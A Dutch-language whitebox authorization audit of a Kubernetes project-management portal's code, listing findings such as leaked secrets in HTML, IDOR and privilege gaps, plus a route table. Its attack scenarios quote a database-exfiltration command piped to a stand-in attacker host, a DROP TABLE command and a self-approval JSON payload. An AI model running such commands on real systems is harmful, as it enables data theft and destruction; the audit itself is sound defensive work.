# Deel B: autorisatie

Whitebox-toets op de code van de Operations Manager (ZAD), gericht op autorisatie: wie mag welke route aanroepen, en is de aanroeper gebonden aan het project waarop hij werkt. Toetskader BIO2 v1.3 (5.15, 5.18, 8.02, 8.03) en OWASP A01 (broken access control, IDOR). Alleen gelezen; niets gewijzigd, niets uitgevoerd tegen een cluster. Paden zijn relatief aan `operations-manager/python/` tenzij anders vermeld.

## Onderzocht

- De volledige routeset zoals de app hem registreert. Niet alleen de decorators in de bron (187 hits), maar de runtime-tabel van `create_app()` (`opi/server.py:406`): 295 routes plus een static mount, inclusief de 104 dynamisch gegenereerde v2-serviceroutes (`opi/api/v2/router.py:2941, 2952, 2972, 3765, 4198, 4212`) en de FastAPI-docs. Per route is de decoratorketen via `__wrapped__` afgelopen, zodat een vergeten decorator niet aan een grep-patroon kon ontsnappen.
- De herkenningslaag: `opi/middleware/authorization.py`, `opi/core/auth_decorators.py`, `opi/api/endpoint_util.py`, `opi/api/user_token_auth.py`, `opi/utils/csrf.py`.
- De beslissingslaag: `opi/services/user_service.py`, `opi/services/project_authorization.py`, `opi/web/project_edit_security.py`, `opi/web/router_detail_edit.py:_require_project_member_access`, `opi/core/startup.py:565-606`.
- Web-routes: `opi/web/router.py`, `router_tasks.py`, `task_progress.py`, `router_detail_edit.py`, `router_attachments.py`, `router_wizard.py`, `router_wizard_attachments.py`, `project_actions.py`, `router_self_service.py`, `router_user_admin.py`, `router_approvals.py`, `router_usage.py`, `router_shared_services.py`, `services_router.py`, `metrics_explorer_router.py`, `lotc_router.py`, `lotc_fixtures.py`, en de catalogusroutes `opi/services/catalog/shared/{db_console,jobs,backups}.py`, `image_registries/web.py`, `sleep_mode/router.py`, `vlam/routes.py`.
- API-routes: `opi/api/router.py`, `v2/router.py`, `v2/project_read.py`, `task_router.py`, `backup_router.py`, `restore_router.py`, `image_router.py`, `logs_router.py`, `logs_websocket_router.py`, `resource_router.py`, `federation_router.py` (+ `opi/core/federation_config.py`), `admin_router.py`, `invite_routes.py`, `auth_routes.py`, `prometheus_router.py` (+ `opi/core/metrics.py`).
- Goedkeuringen en het schrijfpad: `opi/services/approvals.py`, `opi/services/catalog/approval.py`, `opi/services/catalog/publish_on_web/config_model.py`, `opi/connectors/subdomain.py`, `opi/forms/editables/{converters,enforcers}.py`, `opi/forms/wizard/{mutation,services_merge,save,write_set}.py`, `opi/manager/project_validation.py`, `opi/services/project_store.py:673-711`, `opi/utils/naming.py`.
- Tests: `tests/test_authorization.py`, `test_admin_check.py`, `test_admin_diensten_toegang.py`, `test_wizard_role_gate.py`, `oppervlak.py`, plus een sweep over alle tests die een 401/403 asserteren.
- Buiten de code: `features/project-opvragen-api.md`, `scripts/` (het genoemde `extract_project_api_key.py` bestaat niet; `scripts/project_decrypt.py` is het dichtstbijzijnde en vereist de systeem-AGE-sleutel).

Niet gedaan: de routes over HTTP aanroepen tegen een draaiende instantie. Alle oordelen zijn code-gebaseerd; waar een keten volledig is gelezen staat BEVESTIGD, anders AANNEMELIJK.

## Autorisatiemodel zoals het in de code staat

**Drie herkenningswegen.**

1. Sessie (Keycloak OIDC). `AuthorizationMiddleware` slaat `/api/`, `/health*`, `/ready*`, `/version`, `/static/` en exact `/metrics` over (`opi/middleware/authorization.py:27-35, 87-96`). Voor elke andere route zoekt hij het endpoint op en leest `_requires_sso`; ontbreekt het attribuut, dan is de route publiek (`:150` `getattr(endpoint, "_requires_sso", False)`); een niet-gematcht pad vereist wel SSO (`:156`). Een ingelogde gebruiker moet bovendien op de allowlist staan (`:116`). De callback weigert een niet-geverifieerd e-mailadres (`opi/api/auth_routes.py:124`).
2. Project-API-key. `validate_api_token` eist `X-API-Key`, haalt `project_name` uit de route-kwargs, en vergelijkt constant-time met `project.api_key` (`opi/api/endpoint_util.py:50-74`). De key is dus structureel aan het project in het pad gebonden; een route zonder `project_name` antwoordt altijd 401 (`:58-64`). Daarnaast `validate_admin_api_key` (`:103`) en `validate_master_api_key` (`:144`), beide 501 als de key niet is geconfigureerd.
3. Bearer SSO-token (`opi/api/user_token_auth.py`): vaste asymmetrische algoritmen (`:42`), iss/aud/exp tegen de discovery (`:161-165`), `email_verified` verplicht (`:212`), allowlist (`:215`). Gebruikt op precies twee routes: `GET/POST /api/v2/projects`.

**Rollen.** Platform-admin is een in-memory set gevuld bij opstart uit een hardcoded adres plus `ADMIN_EMAILS` (`opi/core/startup.py:597-606`, `opi/services/user_service.py:279-281`); geen route kan die set wijzigen. Projectrollen staan in het projectbestand (`users[].role`, enum `admin|owner|member|developer`, `opi/schemas/project_v2.json:75`). `is_user_authorized_for_project` geeft waar voor elk lid en voor elke platform-admin (`opi/services/project_authorization.py:40-57`); `PROJECT_EDIT_ROLES = ("admin", "owner")` (`:27`) is de schrijfgrens, afgedwongen door `require_project_edit_access` (`opi/web/project_edit_security.py:29-49`). De API-key kent geen rol: wie hem heeft mag alles op het project (`project_authorization.py:24-26`).

**Allowlist.** In-memory, gevuld uit een default, `ALLOWED_EMAILS`, de users-tabel, en elk `users`-blok van elk project bij laden en registreren (`opi/core/startup.py:572-594`, `opi/services/project_store.py:1158`, `opi/services/project_service.py:105`). Lid toevoegen aan een project = toegang tot het portaal.

**CSRF.** Centrale middleware met double-submit plus Origin/Referer op alle onveilige methoden buiten `/api/`, `/static/`, `/auth/` (`opi/utils/csrf.py:52-58, 67-96`).

## Sterke plekken

- Fail-closed middleware: een niet-gematcht pad vereist SSO (`authorization.py:156`), de skip-lijsten zijn exact of prefix-met-slash, en `/metrics` matcht niet `/metrics-explorer` (getest in `tests/test_authorization.py:110`).
- Projectbinding van de API-key is structureel, niet per handler: de decorator weigert zonder `project_name` en overschrijft `kwargs["project_name"]` met de naam uit de store (`endpoint_util.py:58-74`). Alle 131 api-key-routes, ook de 104 gegenereerde, dragen hem (runtime geverifieerd).
- Restore-routes met `{cluster}/{namespace}` in het pad toetsen dat de namespace van het key-project is (`opi/api/restore_router.py:68-98`, aangeroepen op `:636, 677, 757, 1843, 1985`); projectniveau-restores nemen de namespace uit het projectbestand, nooit uit de aanroep. Geen body-model heeft een bronproject-veld.
- Namespace-pin: `enforce_namespace_pin` weigert elke namespace die niet gelijk is aan de projectnaam (`opi/manager/project_manager.py:222-245`, `:776`; `opi/core/git_monitor.py:45`). Projectnaam en cluster worden server-side bepaald bij aanmaken (`v2/router.py:1249-1256`).
- Elke muterende web-route hercontroleert de rol op het moment van schrijven (TOCTOU): `router_wizard.py:875, 2561`, `router_detail_edit.py:1387`; `IMMUTABLE_PROJECT_FIELDS` (`name`, `clusters`) geven 400 (`project_edit_security.py:54-75`).
- Taakvoortgang onder `/projects/{p}/task-progress/{id}` is gebonden aan pad-project en aan starter-of-lid (`router.py:3010-3038`); de v2 task-API bindt via key-vs-`task.project_name` of bearer-e-mail == `created_by` (`task_router.py:117`) en filtert de lijst server-side.
- Leesroutes van de API redigeren secrets (`v2/project_read.py:66`, AGE- en `plain:`-waarden naar `***`), geven nooit `api-key` of AGE-sleutels terug; `features/project-opvragen-api.md` klopt met de code. `/api/federation/peers` laat `api_key` weg.
- Platform-managed velden zijn op het model gedeclareerd en op de API-schrijfweg afgedwongen met 422 (`v2/router.py:2577-2607`, `opi/services/services.py:1345-1372`).
- Admin-pagina's sluiten zelf de deur, niet alleen het menu: `require_platform_admin` op metrics-explorer, approvals, usage, diensten, users; negatief getest in `tests/test_admin_diensten_toegang.py`.
- Log-toegang: één autoriteit voor podselectie (`logs_router.py:44`), de websocket verifieert de sessiecookie handmatig met `max_age`, Origin, allowlist en lidmaatschap (`logs_websocket_router.py:134-180, 367, 388, 397`).
- Wizard-sessies: uuid4-token met regex vóór elke bestandsoperatie, 24 uur purge, secrets geredigeerd op schijf, staged uploads 0600, grootte-limiet gedeeld met de API.
- Bearer-pad, invite-SSO (sessiebinding, state, PKCE, `invite_routes.py:550-556`), sessiecookie (`https_only`, `SameSite=lax`, geen default `SECRET_KEY`).

## Bevindingen

### B-1 Ontsleutelde secrets in de HTML voor rollen member en developer

- Ernst: Hoog
- Zekerheid: BEVESTIGD (keten gelezen tot in de templates)
- BIO2: 5.15, 8.03, 5.18
- Beschrijving: de projectdetailpagina laat elk projectlid toe (`opi/web/router.py:1507` `is_user_authorized_for_project`) en ontsleutelt daarna api-key, AGE-private-key, Keycloak-wachtwoorden, user-env-vars, aliases en helm-values in de template-context (`router.py:1543-1660`). De rol wordt alleen opgehaald voor presentatie (`:1517`). In de template is uitsluitend het blok "Configuratie & Secrets" gegate op `user_role in ["admin", "owner"]` (`project-tabs.html.j2:163`) en de Keycloak-sectie (`catalog/keycloak/__init__.py:98`). Niet gegate: component user-env-vars (`project-tabs.html.j2:625` `<c-secret-field value="{{ waarde }}" show-copy />`), aliases (`:661`), helm-values (`:725, :765`), deployment user-env-vars en helm-values (`_section-deployments.html.j2:135, 161, 211`). `c-secret-field` maskeert client-side; de plaintext staat in de HTML.
- Aanvalsscenario: een gebruiker met rol `member` of `developer` opent de detailpagina, bekijkt de bron en leest databasewachtwoorden en API-tokens uit user-env-vars. Geen exploit nodig.
- Aanbeveling: ontsleutel alleen wat de rol mag zien (server-side, vóór de render), of gate elk `c-secret-field` op `PROJECT_EDIT_ROLES`. Voeg een test toe die als `member` rendert en asserteert dat geen enkele ontsleutelde waarde in de response staat.

### B-2 IDOR op taakvoortgang via de modal-wizard

- Ernst: Midden
- Zekerheid: BEVESTIGD
- BIO2: 5.15, 8.03
- Beschrijving: `GET /projects/{project_name}/modal-wizard/progress/{task_id}` (`opi/web/router_detail_edit.py:1678-1711`) haalt `task = await task_service.get_task(task_id)` op en rendert `_v2_task_to_template_context(task, project_name)` zonder lidmaatschapscontrole en zonder `task.get("project_name") != project_name`. De zusterroute in `router.py:3024-3038` is precies hiervoor gehard ("The task id alone used to be enough to read any task's steps"); deze niet.
- Aanvalsscenario: elke ingelogde allowlist-gebruiker leest status, stappen, `error_message` en `component_failures` van elke taak op het platform door het task-id te raden of uit een andere bron te halen (UUIDv4, dus raden is duur; lekken via logs, links of de takenlijst van een eigen project is realistischer).
- Aanbeveling: vervang de lookup door `_require_task_of_project(...)` uit `router.py:3024`, zoals de andere twee fragmentroutes.

### B-3 Jobs en db-console: elke projectrol mag code in de namespace uitvoeren met het databasesecret

- Ernst: Hoog
- Zekerheid: BEVESTIGD
- BIO2: 8.02, 5.18, 8.03
- Beschrijving: `POST /projects/{p}/jobs` (`opi/services/catalog/shared/jobs.py:113-117`) en `POST /projects/{p}/db-console` (`opi/services/catalog/shared/db_console.py:115-119`) eisen alleen `_require_project_member_access` (`opi/web/router_detail_edit.py:200-213`, elke rol). De job neemt `image` en `command` uit het formulier (`jobs.py:120-122`), draait het command via `/bin/sh -c` (`manifests/job-pod.yaml.jinja:41-46`), onder het project-serviceaccount (`opi/manager/job_manager.py:223`, `job-pod.yaml.jinja:29`) en met het databasesecret van de deployment als `envFrom` (`job-pod.yaml.jinja:64-69`). De enige inhoudelijke rem op de image is de registry-eigenaarscheck (`job_manager.py:110-116`), die alleen andermans platform-registry weigert; elke publieke image mag. Elke andere mutatie in het portaal vraagt admin/owner; deze twee routes muteren niet het projectbestand maar wel de data.
- Aanvalsscenario: een `member` start een job met image `postgres:16` en command `pg_dump ... | curl -T - https://attacker/` en exfiltreert de productiedatabase, of `psql -c 'DROP TABLE ...'`. De db-console geeft dezelfde rol interactief pgweb/psql op de database.
- Aanbeveling: beperk starten van jobs en db-console tot `PROJECT_EDIT_ROLES`, of introduceer een expliciete rol/grant voor operationele toegang (zie het rechtenontwerp in `features/futures/rechten-*.md`). Log starter, image en command als beveiligingsgebeurtenis (gebeurt deels via annotaties `job_manager.py:213`).

### B-4 Project-admin kan een domein zelf op `approved` zetten via de services-selectie

- Ernst: Hoog
- Zekerheid: BEVESTIGD op functieniveau (converter, mutation, normalisatie en `validate_service_configs` doorlopen met de payload; niet over HTTP uitgevoerd)
- BIO2: 8.02, 5.18
- Beschrijving: goedkeuren is correct beperkt tot platform-admins (`opi/web/router_approvals.py:269, 318, 368`) en de API weigert `domains` als platform-managed (`config_model.py:231-243`, `v2/router.py:2577-2607`). Maar de webweg heeft die rem niet. De services-selectie-editable heeft geen validator en de converter bewaart dict-entries ongewijzigd (`opi/forms/editables/converters.py:167-199` "These dicts are kept as-is"). `apply_selection_mutation` doet `deep_merge_into` waarbij lijsten worden vervangen (`opi/forms/wizard/services_merge.py:44-82`, `opi/forms/editables/merge.py:14-25`), `_extract_section_data` kopieert het hele `services`-veld (`opi/web/router_wizard.py:1745-1760`), en `apply_modal_edit` schrijft het weg (`opi/forms/wizard/save.py:340-348`). De store-validatie kent geen regel die de approval-status met `previous` vergelijkt (`opi/manager/project_validation.py:814-1045`); `status: approved` is een geldige enumwaarde (`config_model.py:71-95`). Het manifestpad vertrouwt de opgeslagen status (`opi/connectors/subdomain.py:310` `if domain_config.get("status") != "approved": return False`), dus daarna worden ingress en cert-issuer voor het domein aangemaakt (`opi/utils/naming.py:1937`, `publish_on_web/issuer.py:77`). Hetzelfde kanaal bereikt `send-email` approvals (`catalog/approval.py:214-229`) en `keycloak.realms`.
- Aanvalsscenario: een projectowner bewerkt de services-selectie in de modal en stuurt een payload `[{"publish-on-web": {"config": {"domains": {"allowed-domains": [{"domain": "login.rijksoverheid.nl", "status": "approved", "history": []}]}}}}]`. Het domein wordt gepubliceerd zonder dat een beheerder het heeft gezien.
- Aanbeveling: pas de `_keep_platform_fields`-logica van de API ook toe op het formulierpad (in `apply_selection_mutation` of `merge_service_lists`), en voeg op store-niveau een integriteitsregel toe die platform-managed sleutels vergelijkt met `previous` zodat elke schrijfweg gedekt is. Test: owner-payload met `status: approved` moet uitkomen op `requested`.

### B-5 `GET /api/v2/projects` geeft de API-key van elk project terug waar de aanroeper admin/owner is; voor een platform-admin alle keys

- Ernst: Midden
- Zekerheid: BEVESTIGD
- BIO2: 8.02, 5.15
- Beschrijving: `opi/api/v2/router.py:1175-1183` `api_key=project.api_key if role in PROJECT_EDIT_ROLES else None`. De rolgrens klopt met de UI, maar de route maakt van één SSO-access-token met audience `zad-api` (`config.py:210`) een bulk-uitleesweg; voor een platform-admin zijn dat alle keys op het platform. Bovendien doet elke aanroep `await store.reconcile()` (`:1172`), een remote git-operatie die elke allowlist-gebruiker kan triggeren.
- Aanvalsscenario: een gestolen of gelekt access-token van een beheerder (CLI-cache, proxy-log) levert in één call alle projectkeys, en elke key geeft volledige mutatierechten zonder rolonderscheid.
- Aanbeveling: geef de key alleen op een expliciete per-project call (`GET /api/v2/projects/{p}/api-key` met audit-log), nooit in een lijst; overweeg key-rotatie en scope voor platform-admins. Zet `reconcile()` achter een rate limit of maak hem asynchroon.

### B-6 `/metrics` publiceert command-lines van subprocessen zonder authenticatie

- Ernst: Midden
- Zekerheid: BEVESTIGD (dat er secrets in argv staan is AANNEMELIJK, niet aangetoond)
- BIO2: 8.03, 5.15
- Beschrijving: `opi/core/metrics.py:197` `labels=["pid", "command"]` en `:221-223` `cmdline = f.read().replace("\0", " ").strip()[:100]; child_rss.add_metric([entry, cmdline], ...)`. De eerste 100 tekens van argv van elk kubectl/git/sops/age-kindproces staan als labelwaarde op een endpoint dat de middleware bewust overslaat (`authorization.py:27`).
- Aanvalsscenario: iedereen die `/metrics` kan bereiken ziet namespaces, projectnamen en mogelijk tokens in git-URL's of `--token`-argumenten.
- Aanbeveling: label op procesnaam (argv[0]) in plaats van volledige cmdline; of bescherm `/metrics` met een scrape-token of NetworkPolicy naar de Prometheus-pod.

### B-7 Restore met `restore_mode == new` laat een member het projectbestand wijzigen

- Ernst: Midden
- Zekerheid: AANNEMELIJK (code gelezen, flow niet uitgevoerd)
- BIO2: 5.18, 8.02
- Beschrijving: backup/restore-flows vereisen bewust alleen lidmaatschap (`router_detail_edit.py:656-660, 881-884, 1169-1172, 1187-1190`); `_modal_do_submit` slaat de edit-gate voor deze flows over (`:1384-1387`, getest in `tests/test_wizard_role_gate.py:396`) met de opmerking dat er "verderop een member-level gate" zit; `_handle_backup_restore_submit` (`:1566`) heeft er geen. Bij restore naar een nieuwe deployment gaat de door de gebruiker getypte `deployment_config` (`:1618-1653`) naar `handle_restore` (`opi/core/task_handlers_backup.py:247-259`), die een nieuwe deployment in het projectbestand schrijft en commit (`opi/core/backup_tasks.py:157`). Restore over een bestaande deployment overschrijft diens data.
- Aanvalsscenario: een `member` maakt via restore een extra deployment aan of zet productie terug naar een oude snapshot; alle andere mutaties vragen admin/owner.
- Aanbeveling: beslis expliciet welke rol mag herstellen; minimaal `restore_mode == new` en overschrijven van een bestaande deployment achter `PROJECT_EDIT_ROLES`.

### B-8 Invite-links verlopen niet, zijn meervoudig bruikbaar en ongelimiteerd

- Ernst: Midden
- Zekerheid: BEVESTIGD
- BIO2: 5.18, 5.15
- Beschrijving: `InviteEntry` heeft geen verloop- of max-uses-veld (`opi/services/catalog/invite/config_model.py:55-116`); `_find_project_by_invite_key` toetst alleen aanwezigheid in `active` (`opi/api/invite_routes.py:183-224`); `POST /invite/{key}/register` (`:721-923`) maakt een Keycloak-gebruiker in het projectrealm aan en kent de realm-/client-rollen en groepen van de invite toe (`invite_manager.py:192-231`), zonder rate limit of CAPTCHA. De key is 128 bit (`invite/__init__.py:76`), dus raden is geen risico; lekken wel.
- Aanvalsscenario: een eenmaal gedeelde link blijft onbeperkt accounts met rollen aanmaken tot iemand hem handmatig verwijdert.
- Aanbeveling: verloopdatum en max-uses op de invite, rate limit op register, audit-log per registratie.

### B-9 Service-config leesroute redigeert niet

- Ernst: Laag
- Zekerheid: BEVESTIGD
- BIO2: 8.03
- Beschrijving: `GET /api/v2/projects/{p}/services/{service}/config` (`v2/router.py:2408`) stript alleen platform-managed velden (`:2368-2372`) en past `redact_secrets` niet toe, in tegenstelling tot `project_read.py:66`. Een `plain:`-wachtwoord van image-registries (`image_registries/config_model.py:115`) komt letterlijk terug; invite-keys bewust (`:2437-2441`). Alleen de eigen key-houder ziet dit, dus geen horizontale lek.
- Aanbeveling: dezelfde redactie als op de projectleesroutes.

### B-10 Wizard-attachmentroutes en modal-state zijn niet aan het pad-project gebonden

- Ernst: Laag
- Zekerheid: AANNEMELIJK
- BIO2: 5.15
- Beschrijving: `router_wizard_attachments.py` (`_resolve_state:67`) neemt de state uit cookie of `_wizard_token` en vergelijkt `flow_id` uit het pad nooit met `state.flow_id`; geen enkele route in `router_detail_edit.py` vergelijkt `state.project_name` met het pad. `_modal_do_submit` (`:1411-1433`) past de merged state toe op het pad-project. Uitbuiten vereist edit-rechten op dat pad-project (`:1387`), dus dit is dataverwarring, geen escalatie; maar het token is de enige sleutel en reist in querystrings en hidden inputs.
- Aanbeveling: bind token-states aan de gebruikerssessie en toets `state.project_name == project_name` op elke modal-route.

### B-11 Sleep-mode geeft een bestaansorakel zonder authenticatie

- Ernst: Laag
- Zekerheid: BEVESTIGD
- BIO2: 8.03
- Beschrijving: `opi/services/catalog/sleep_mode/router.py:60-61` `if wake_token: return wake_token` zonder toets; `flow.py:128-141` geeft 404 voor onbekend project/deployment vóór `_verify_token` 401. Zelfde patroon, kleiner, in `task_router.py:180-190` (404 vóór authenticatie op task-id).
- Aanbeveling: eerst authenticeren, dan opzoeken; of overal 404 antwoorden.

### B-12 Help-route rendert elk template dat de loader kent

- Ernst: Laag
- Zekerheid: AANNEMELIJK
- BIO2: 8.03
- Beschrijving: `router_wizard.py:1272` `template_path = template_name if "/" in template_name else f"help/{template_name}"`, gevolgd door een render met lege context. De regex op `:1246` blokkeert traversal, maar elk `<map>/<naam>.html.j2` uit de templates- en catalogusroots is opvraagbaar; `StrictUndefined` maakt de meeste een 404 (`:1278`), templates zonder variabelen worden getoond.
- Aanbeveling: beperk tot `help/`.

### B-13 Test- en demoroutes staan aan in productie

- Ernst: Info
- Zekerheid: BEVESTIGD
- BIO2: 8.03
- Beschrijving: `/lotc/`, `/lotc/pagina/{slug}`, `/lotc/formulier`, `/lotc/bg/{slug}` zijn publiek (geen `@requires_sso`) en onvoorwaardelijk geregistreerd (`opi/server.py:688`). Ze renderen alleen fixture-data met placeholder-waarden (`opi/web/lotc_fixtures/voorbeeld-klein.yaml:54-55` `api-key: VOORBEELDWAARDE-geen-echte-sleutel`) en een allowlist van pagina's (`lotc_router.py:101`). Daarnaast `/test-hero`, `/forms/formulier`, `/test-template-variables`, `/example` (ingelogd) en `/docs`, `/redoc`, `/openapi.json` (publiek). Geen lek gevonden; wel onnodig oppervlak en het toont de interne structuur van de UI.
- Aanbeveling: achter `settings.DEBUG` of een feature-flag zetten.

### B-14 Externe clone- en restore-doelen: SSRF-vorm by design

- Ernst: Laag
- Zekerheid: AANNEMELIJK
- BIO2: 8.03
- Beschrijving: `:clone-database-from-external` (`opi/api/router.py:2535`, `sourceHost/sourcePort/sourcePassword`), `:clone-bucket-from-external` (`:2700`), restore database/bucket met extern doel (`restore_router.py:1752`, model `:281`; `:1903`, model `:367`) laten de OPI-pod met door de aanroeper gekozen host en credentials verbinden. Geen host-allowlist gevonden; NetworkPolicy is de enige rem. Vereist een geldige projectkey, dus geen anonieme SSRF.
- Aanbeveling: allowlist van bestemmingen of egress-policy op de OPI-pod vastleggen en documenteren.

### B-15 Projectaanmaak: geen quotum, wel juiste rolvastlegging

- Ernst: Info
- Zekerheid: BEVESTIGD
- BIO2: 5.18
- Beschrijving: `POST /api/v2/projects` (`v2/router.py:1196-1297`) is voor elke allowlist-gebruiker; body is alleen `display_name` en `description` (`v2/models.py:191-218`), cluster is `settings.CLUSTER_MANAGER` (`:1249`), de aanroeper wordt admin (`project_utils.py:538`). Goed. Er is geen quotum of rate limit, en elke call genereert keys, schrijft een bestand en zet een taak klaar.
- Aanbeveling: quotum per gebruiker.

### B-16 Lid verwijderen synct de allowlist niet terug

- Ernst: Laag
- Zekerheid: AANNEMELIJK
- BIO2: 5.18
- Beschrijving: toevoegen aan `users` allowlist automatisch (`project_store.py:1158`, `project_service.py:105`); niets roept `remove_allowed_email` aan bij verwijderen uit een project (alleen `router_user_admin.py:278, 304`). Een verwijderd lid houdt portaaltoegang tot herstart; projecttoegang blijft wel geblokkeerd door `is_user_authorized_for_project`.
- Aanbeveling: herbereken de allowlist bij elke projectsave, of maak hem afgeleid in plaats van cumulatief.

### B-17 Testdekking: de meeste autorisatiegrenzen hebben geen negatieve test

- Ernst: Midden (procesmatig)
- Zekerheid: BEVESTIGD
- BIO2: 5.15, 8.02
- Beschrijving: `tests/oppervlak.py` is geen autorisatiesnapshot maar een gedragsmeetlat voor de UI-omzetting (links, htmx-adressen, formuliervelden; docstring regel 1-24) en legt niets vast over wie een route mag aanroepen. `tests/test_authorization.py` toetst het middleware-mechanisme (default False op een niet-geannoteerd endpoint `:271, 294`; skip-lijsten; allowlist-redirect) maar niet dat elke route een annotatie heeft. Er is geen test die asserteert dat elke niet-`/api/`-route `@requires_sso` draagt of dat elke `/api/`-route een auth-decorator heeft; dat is nu een grep-discipline. Negatieve tests bestaan voor: middleware, admin-pagina's (`test_admin_diensten_toegang.py`), wizard-editgate en immutable velden (`test_wizard_role_gate.py`), project-acties (`test_project_actions.py`, `test_deployment_action_confirm.py`, `test_detail_edit.py`), voortgangspagina (`test_project_progress_page.py`), api-key-decorator (`test_endpoint_util.py`), task-API (`test_task_router.py`), sleep-mode, image-router, logs-podselectie, bearer (`test_user_token_auth.py`, `test_list_projects_api.py`, `test_create_project_api.py`), restore-namespace (`test_tenant_isolation_namespace.py`), admin-reconcile, subdomein-check, CSRF. Geen negatieve autorisatietest gevonden voor: jobs en db-console (B-3), `modal-wizard/progress` (B-2), wizard-attachments (B-10), backup_router, restore-projectroutes (body), invite-flow (B-8), user-admin routes, approvals-routes, `/tools/*`, help-route (B-12), resource_router, federation, logs-websocket, metrics-explorer (alleen `requires_sso` getest), de rolgrens op de detailpagina (B-1) en de approval-injectie via het formulier (B-4).
- Aanbeveling: één routetabel-test die per geregistreerde route de verwachte herkenning vastlegt (sessie/api-key/bearer/admin/master/publiek) met een expliciete allowlist van publieke routes; plus negatieve tests voor B-1 t/m B-4.

## Routetabel

295 routes plus de static mount, zoals `create_app()` ze registreert (runtime-enumeratie, decoratorketen via `__wrapped__`). Herkenning: sessie (`@requires_sso`), api-key (`validate_api_token`), bearer, admin-key, master-key, geen. Oordeel `ok` betekent: de controle past bij wat de route doet; `zie B-n` verwijst naar een bevinding op een route die wel een controle heeft.

Samenvatting: 97 sessie, 131 api-key, 7 admin-key, 4 master-key, 2 bearer, 54 zonder decorator. Van die 54 hebben 9 een inline controle in de handler (logs-pods, logs-websocket, 3 task-routes, 2 sleep-mode, en de 2 catalogusmetadata-routes zijn projectonafhankelijk), 10 zijn blinde redirects, 8 vormen de invite-flow (key in pad), 4 zijn OIDC, 4 zijn FastAPI-docs, en de rest zijn probes, statische bestanden en bewust publieke pagina's. Geen route is gevonden die per ongeluk zonder herkenning een project leest of schrijft; de bevindingen B-1 t/m B-7 zitten allemaal achter een herkenning en gaan over de beslissing daarna.

| Methode | Pad | Bestand:regel | Herkenning | Autorisatiecontrole | Oordeel |
|---|---|---|---|---|---|
| GET | `/openapi.json` | .venv/lib/python3.14/site-packages/fastapi/applications.py:1105 | geen | publiek | ok |
| GET | `/docs` | .venv/lib/python3.14/site-packages/fastapi/applications.py:1120 | geen | publiek: OpenAPI UI | ok |
| GET | `/docs/oauth2-redirect` | .venv/lib/python3.14/site-packages/fastapi/applications.py:1138 | geen | publiek | ok |
| GET | `/redoc` | .venv/lib/python3.14/site-packages/fastapi/applications.py:1148 | geen | publiek | ok |
| GET | `/auth/login` | opi/api/auth_routes.py:22 | geen | OIDC start | ok |
| GET | `/auth/callback` | opi/api/auth_routes.py:79 | geen | OIDC callback, email_verified vereist | ok |
| GET | `/auth/logout` | opi/api/auth_routes.py:165 | geen | sessie | ok |
| GET | `/auth/user` | opi/api/auth_routes.py:225 | geen | sessie-only, geeft sub/email/name | ok |
| POST | `/api/projects/{project_name}/:upsert-deployment` | opi/api/router.py:1057 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| POST | `/api/projects/{project_name}/components` | opi/api/router.py:1325 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PATCH | `/api/projects/{project_name}/components/{component_name}` | opi/api/router.py:1506 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| POST | `/api/projects/{project_name}/deployments/{deployment_name}/components` | opi/api/router.py:1637 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| POST | `/api/projects/{project_name}/services` | opi/api/router.py:1797 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PUT | `/api/projects/{project_name}/deployments/{deployment_name}/image` | opi/api/router.py:1953 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| GET | `/api/projects/{project_name}/:refresh` | opi/api/router.py:2128 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| GET | `/api/projects/{project_name}/deployments/{deployment_name}/:refresh` | opi/api/router.py:2222 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| DELETE | `/api/projects/{project_name}` | opi/api/router.py:2343 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| DELETE | `/api/projects/{project_name}/{deployment_name}` | opi/api/router.py:2437 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| POST | `/api/projects/{project_name}/deployments/{deployment_name}/:clone-database-from-external` | opi/api/router.py:2535 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok, zie B-14 |
| POST | `/api/projects/{project_name}/deployments/{deployment_name}/:clone-bucket-from-external` | opi/api/router.py:2700 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok, zie B-14 |
| POST | `/api/projects/{project_name}/deployments/{deployment_name}/:validate-clone` | opi/api/router.py:2864 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| GET | `/api/subdomains` | opi/api/router.py:3172 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74); project_name is verplichte query-parameter | ok |
| POST | `/api/projects/{project_name}/registries/by-secret` | opi/api/router.py:3257 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| POST | `/api/projects/{project_name}/registries/by-credentials` | opi/api/router.py:3354 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| GET | `/api/v1/backup/status` | opi/api/backup_router.py:306 | master-key | validate_master_api_key (endpoint_util.py:158-182) | ok |
| POST | `/api/v1/backup/project/{project_name}/deployment/{deployment_name}` | opi/api/backup_router.py:345 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| GET | `/api/v1/backup/runs/{project_name}/{deployment_name}` | opi/api/backup_router.py:654 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| DELETE | `/api/v1/backup/snapshot/{project_name}/{deployment_name}/{snapshot_id}` | opi/api/backup_router.py:794 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
